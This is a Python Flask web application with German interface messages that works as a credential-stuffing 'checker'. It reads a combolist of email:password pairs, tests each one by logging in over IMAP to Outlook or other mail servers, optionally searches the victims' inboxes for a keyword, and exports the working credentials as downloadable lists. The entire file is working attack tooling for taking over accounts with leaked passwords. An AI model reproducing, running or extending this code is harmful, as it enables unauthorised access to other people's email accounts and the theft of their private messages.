from flask import Flask, render_template, request, jsonify
import imaplib
import threading
import time
import os

app = Flask(__name__)

checking = False
results = []
stats = {}
progress = 0

def get_imap_server(email):
    domain = email.split('@')[1].lower()
    outlook = ["hotmail.com", "outlook.com", "live.com", "hotmail.fr"]
    if domain in outlook:
        return 'outlook.office365.com'
    return f'imap.{domain}'

def check_email(email, password):
    try:
        imap = imaplib.IMAP4_SSL(get_imap_server(email), timeout=15)
        imap.login(email, password)
        imap.select("inbox")
        imap.logout()
        return True
    except:
        return False

def search_inbox(email, password, keyword):
    try:
        imap = imaplib.IMAP4_SSL(get_imap_server(email), timeout=15)
        imap.login(email, password)
        imap.select("inbox")
        result, data = imap.search(None, f'TEXT "{keyword}"')
        imap.logout()
        if result == "OK" and data[0]:
            return len(data[0].split())
        return 0
    except:
        return 0

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/start', methods=['POST'])
def start():
    global checking, results, stats, progress
    if checking:
        return jsonify({'status': 'error', 'message': 'Check läuft!'})
    
    data = request.json
    mode = data.get('mode', 'checker')
    keyword = data.get('keyword', '')
    combolist = data.get('combolist', '')
    
    if mode == 'inbox' and not keyword:
        return jsonify({'status': 'error', 'message': 'Keyword eingeben!'})
    
    accounts = []
    for line in combolist.strip().split('\n'):
        if ':' in line:
            parts = line.split(':', 1)
            if '@' in parts[0]:
                accounts.append((parts[0].strip(), parts[1].strip()))
    
    if not accounts:
        return jsonify({'status': 'error', 'message': 'Keine Accounts!'})
    
    results = []
    stats = {'total': len(accounts), 'done': 0, 'valid': 0, 'hits': 0, 'bad': 0}
    progress = 0
    checking = True
    
    def run():
        global checking, results, stats, progress
        for email, password in accounts:
            if not checking:
                break
            if mode == 'checker':
                valid = check_email(email, password)
                result = {'email': email, 'password': password, 'valid': valid, 'hits': 0}
                if valid:
                    stats['valid'] += 1
                else:
                    stats['bad'] += 1
            else:
                count = search_inbox(email, password, keyword)
                valid = count > 0
                result = {'email': email, 'password': password, 'valid': valid, 'hits': count}
                if valid:
                    stats['valid'] += 1
                    stats['hits'] += 1
                else:
                    stats['bad'] += 1
            results.append(result)
            stats['done'] += 1
            progress = int((stats['done'] / stats['total']) * 100)
            time.sleep(0.05)
        checking = False
    
    threading.Thread(target=run).start()
    return jsonify({'status': 'ok', 'message': f'Start! {len(accounts)} Accounts'})

@app.route('/status')
def status():
    return jsonify({
        'checking': checking,
        'stats': stats,
        'results': results[-20:],
        'progress': progress
    })

@app.route('/stop', methods=['POST'])
def stop():
    global checking
    checking = False
    return jsonify({'status': 'ok'})

@app.route('/clear', methods=['POST'])
def clear():
    global results, stats
    results = []
    stats = {}
    return jsonify({'status': 'ok'})

@app.route('/export/<type>')
def export(type):
    if not results:
        return "Keine Ergebnisse", 404
    content = ""
    filename = ""
    if type == 'valid':
        content = "\n".join([f"{r['email']}:{r['password']}" for r in results if r['valid']])
        filename = "valid.txt"
    elif type == 'hits':
        content = "\n".join([f"{r['email']}:{r['password']} | Hits: {r['hits']}" for r in results if r.get('hits', 0) > 0])
        filename = "hits.txt"
    elif type == 'all':
        content = "\n".join([f"{r['email']}:{r['password']} | {'✅ VALID' if r['valid'] else '❌ BAD'}" for r in results])
        filename = "all.txt"
    return content, 200, {'Content-Type': 'text/plain', 'Content-Disposition': f'attachment; filename={filename}'}

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port)
